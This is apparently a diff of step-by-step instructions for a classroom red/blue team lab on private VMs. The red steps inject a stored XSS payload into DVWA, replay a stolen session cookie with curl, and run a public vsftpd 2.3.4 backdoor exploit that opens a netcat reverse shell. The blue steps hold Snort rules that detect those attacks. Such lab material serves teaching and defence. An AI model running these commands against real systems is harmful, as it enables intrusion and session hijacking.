@@ -1,4 +1,17 @@
-https://raw.githubusercontent.com/syedmuhammadhussamasifnaqvi/cyberproject/main/command.txt
+------------------------
+Go to Kali 1 (Attack VM for Syed)
+------------------------
+
+Open a terminal and download command file
+    wget https://raw.githubusercontent.com/syedmuhammadhussamasifnaqvi/cyberproject/main/command.txt
+    
+------------------------
+Go to Linux 01 Blue Team (Blue VM for Syed)
+------------------------
+
+Open a terminal and download command file
+    wget https://raw.githubusercontent.com/syedmuhammadhussamasifnaqvi/cyberproject/main/command.txt
+    
 
 -------------------------------------------------------------------
 RED - ATTACK (Stored XSS)
@@ -7,48 +20,69 @@ Remove rule from the firewall (Blue VM)
     Services -> Snort -> LANDMZ -> Edit -> LANDM Categories -> Unselect All -> Save
     Services -> Snort -> LANDMZ -> Edit -> LANDM Rules -> Custom Rules
 
-On desktop 1: 
-    Open command.txt in visual editor
+Open command.txt in visual editor
 
-On desktop 2: Ping 10.30.0.235 to make sure victim VM is up
+In terminal, Ping 10.30.0.235 to make sure victim VM is up
 
-On Desktop 1: 
-    open DVWA website: http://10.30.0.235/dvwa as attacker and login
+open DVWA website: http://10.30.0.235/dvwa as attacker and login
 
-    Change security to low
-    
-    Go to XSS store -> Inject Payload
-        <script>console.log(document.cookie)</script>
+Change security to low
 
-    Attacker Logs out
+Go to XSS store -> Inject Payload
+    <script>console.log(document.cookie)</script>
 
-    Victim logs in
+Attacker Logs out
 
-    Go to XSS Stored page
+Victim logs in
 
-    Script is executed, cookie is sent to attacker (copy it manually for now)
+Go to XSS Stored page
 
-    Attacker user his machine to add a comment using cookie
-        curl -X POST -b "security=low; PHPSESSID=9ecc84081433870a847d9c096762a91f" -d "txtName=WhoAmI&mtxMessage=You%27ve+been+hacked&btnSign=Sign+Guestbook" http://10.30.0.235/dvwa/vulnerabilities/xss_s/
+Script is executed, cookie is sent to attacker (copy it manually for now)
+
+Attacker uses his machine to add a comment using cookie
+    curl -X POST -b "security=low; PHPSESSID=9ecc84081433870a847d9c096762a91f" -d "txtName=WhoAmI&mtxMessage=You%27ve+been+hacked&btnSign=Sign+Guestbook" http://10.30.0.235/dvwa/vulnerabilities/xss_s/
+
+Go to website and refresh the page. The new message would now be visible
 
 -------------------------------------------------------------------
 BLUE - DEFEND (Reverse Shell)
 -------------------------------------------------------------------
 In DMZ interface, remove all extra "LANDM Categories"
 
-Reverse Shell Rule(s):
+Go to Services -> Snort -> LANDMZ -> Edit -> LANDM Rules -> Custom Rules
 
-    alert tcp any any -> 10.30.0.235 21 (msg:"VSFTPD backdoor trigger attempt"; flow:to_server,established; content:"USER "; nocase; pcre:"/^USER\s+[^\r\n]*:\)\r?$/mi"; sid:1000101; rev:1;)
-    alert tcp any any -> 10.30.0.235 6200 (msg:"VSFTPD backdoor shell access"; flow:to_server,established; sid:1000102; rev:1;)
-    alert tcp any any -> 10.30.0.235 any (msg:"Linux reverse shell command string detected"; flow:to_server,established; pcre:"/(\/bin\/sh|\/bin\/bash|\/bin\/dash|sh -i|bash -i)/i"; sid:1000104; rev:2;)
+Add alert rules for Reverse Shell Rule(s):
+
+alert tcp any any -> 10.30.0.235 21 (msg:"VSFTPD backdoor trigger attempt"; flow:to_server,established; content:"USER "; nocase; pcre:"/^USER\s+[^\r\n]*:\)\r?$/mi"; sid:1000101; rev:1;)
+alert tcp any any -> 10.30.0.235 6200 (msg:"VSFTPD backdoor shell access"; flow:to_server,established; sid:1000102; rev:1;)
+alert tcp any any -> 10.30.0.235 any (msg:"Linux reverse shell command string detected"; flow:to_server,established; pcre:"/(\/bin\/sh|\/bin\/bash|\/bin\/dash|sh -i|bash -i)/i"; sid:1000104; rev:2;)
+
+Save
+
+Make sure interface is running
+
+Perform attack, alert should be raised
+
+Go to Services -> Snort -> LANDMZ -> Edit -> LANDM Rules -> Custom Rules
+Change "alert" to "drop" for all rules
+Save
+
+Go to LANDM Settings
+Enable Block Offenders in Block Settings
+Change IPS mode to INLINE
+
+Retry the attack, it should be blocked
 
 -------------------------------------------------------------------
 RED - ATTACK (Reverse Shell)
 -------------------------------------------------------------------
 
-https://github.com/ahervias77/vsftpd-2.3.4-exploit/archive/refs/heads/master.zip
+wget https://github.com/ahervias77/vsftpd-2.3.4-exploit/archive/refs/heads/master.zip
 
-python3 vsftpd_234_exploit.py <Target IP> 21 “netcat -nv <Kali IP address> 4444 -e /bin/bash”
+unzip master.zip
+
+Terminal 1: netcat -nvlp 4444
+Terminal 2: python3 vsftpd_234_exploit.py 10.30.0.235 21 “netcat -nv <Kali IP address> 4444 -e /bin/bash”
 
 -------------------------------------------------------------------
 BLUE - DEFEND (Others)
